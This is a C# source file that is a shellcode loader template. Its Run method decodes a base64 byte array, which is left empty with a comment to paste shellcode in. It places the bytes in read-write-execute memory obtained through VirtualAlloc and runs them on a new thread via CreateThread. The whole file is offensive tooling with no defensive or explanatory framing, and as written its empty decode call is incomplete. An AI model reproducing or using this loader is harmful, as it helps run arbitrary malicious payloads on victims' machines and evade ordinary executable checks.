using System;
using System.IO;
using System.Runtime.InteropServices;

public class EntryPoint
{
    // Paste your shellcode bytes here (or load from an embedded resource)
    static readonly byte[] shellcode = Convert.FromBase64String(
    );

    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        UIntPtr dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32")]
    static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds);

    public static void Run()
    {
        // 0x1000 | 0x2000 = MEM_COMMIT | MEM_RESERVE; 0x40 = PAGE_EXECUTE_READWRITE
        IntPtr exec = VirtualAlloc(
            IntPtr.Zero,
            (UIntPtr)shellcode.Length,
            0x1000 | 0x2000,
            0x40);

        Marshal.Copy(shellcode, 0, exec, shellcode.Length);

        uint threadId;
        IntPtr hThread = CreateThread(
            IntPtr.Zero, UIntPtr.Zero, exec, IntPtr.Zero, 0, out threadId);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}

